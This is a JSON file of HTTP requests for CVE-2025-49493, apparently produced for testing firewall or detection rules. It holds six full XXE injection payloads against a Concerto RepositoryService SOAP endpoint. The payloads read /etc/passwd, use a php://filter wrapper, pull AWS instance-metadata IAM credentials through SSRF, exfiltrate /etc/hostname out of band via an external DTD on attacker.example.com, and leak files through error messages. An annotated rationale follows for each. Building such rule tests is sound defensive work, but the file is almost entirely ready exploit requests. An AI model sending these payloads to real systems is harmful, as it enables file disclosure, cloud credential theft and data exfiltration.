out/CVE-2025-49493/extended-requests.json

{
  "paranoia": 2,
  "injection_slot": "REQUEST_BODY",
  "requests": [
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://attacker.example.com/xxe-test\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    },
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    },
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    },
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\">\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    },
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n  <!ENTITY % dtd SYSTEM \"http://attacker.example.com/oob.dtd\">\n  %dtd;\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>&send;</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    },
    {
      "method": "POST",
      "uri": "/concerto/services/RepositoryService",
      "headers": {
        "Content-Type": "text/html",
        "SOAPAction": ""
      },
      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE soapenv:Envelope [\n  <!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">\n  <!ENTITY % constant 'aaa)>\n        <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n        <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n        %eval;\n        %error;\n        <!ELEMENT aa (bb'>\n  %local_dtd;\n]>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n                  xmlns:rep=\"http://example.com/services/repository\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <rep:getUIBundleObjectXml>\n         <rep:uiBundleRequestXml>xxe</rep:uiBundleRequestXml>\n      </rep:getUIBundleObjectXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
    }
  ],
  "labels": [
    "poc",
    "variant:file-read",
    "variant:php-wrapper",
    "variant:ssrf-metadata",
    "variant:param-entity-oob",
    "variant:error-based-local-dtd"
  ],
  "meta": [
    {
      "label": "poc",
      "evades_rule": null,
      "rationale": "base PoC from Stage 1 probe-input"
    },
    {
      "label": "variant:file-read",
      "evades_rule": null,
      "rationale": "Classic XXE file retrieval via file:// scheme — different protocol from PoC's http:// callback. Uses SYSTEM entity to read /etc/passwd directly, returning file content inline. Technique from PaTT XXE Injection: Classic XXE. Distinct from PoC because PoC only demonstrates OOB callback, not inline file read."
    },
    {
      "label": "variant:php-wrapper",
      "evades_rule": null,
      "rationale": "PHP wrapper inside XXE via php://filter scheme — encodes file content as base64 for retrieval of binary/non-printable files. Technique from PaTT XXE Injection: PHP Wrapper Inside XXE. Distinct from PoC and file-read variant because it uses PHP stream wrapper rather than direct file:// scheme, demonstrating a different retrieval mechanism."
    },
    {
      "label": "variant:ssrf-metadata",
      "evades_rule": null,
      "rationale": "XXE-based SSRF targeting cloud instance metadata (AWS IMDSv1). Technique from PaTT XXE Injection: Exploiting XXE to Perform SSRF Attacks. Distinct from PoC callback because it targets internal infrastructure (169.254.169.254) rather than attacker-controlled external host — demonstrates SSRF attack surface within XXE that plain OOB callback does not cover."
    },
    {
      "label": "variant:param-entity-oob",
      "evades_rule": null,
      "rationale": "Blind XXE out-of-band exfiltration using parameter entities (% entity) with external DTD. Technique from PaTT XXE Injection: Out of Band XXE (Yunusov 2013). Distinct from PoC because it uses parameter entities (%) rather than general entities (&), and chains file read + exfiltration via external DTD rather than simple callback. The %file reads /etc/hostname, %dtd loads external DTD that constructs the &send; callback with file content."
    },
    {
      "label": "variant:error-based-local-dtd",
      "evades_rule": null,
      "rationale": "Error-based XXE using local DTD file to trigger information disclosure through parser error messages. Technique from PaTT XXE Injection: Error Based — Using Local DTD File. Distinct from all other variants because it exploits error-path disclosure rather than inline entity expansion or OOB callback. The local_dtd parameter entity loads a legitimate system DTD, then redefines its parameter entities to construct a forced error that includes file content in the error message."
    }
  ]
}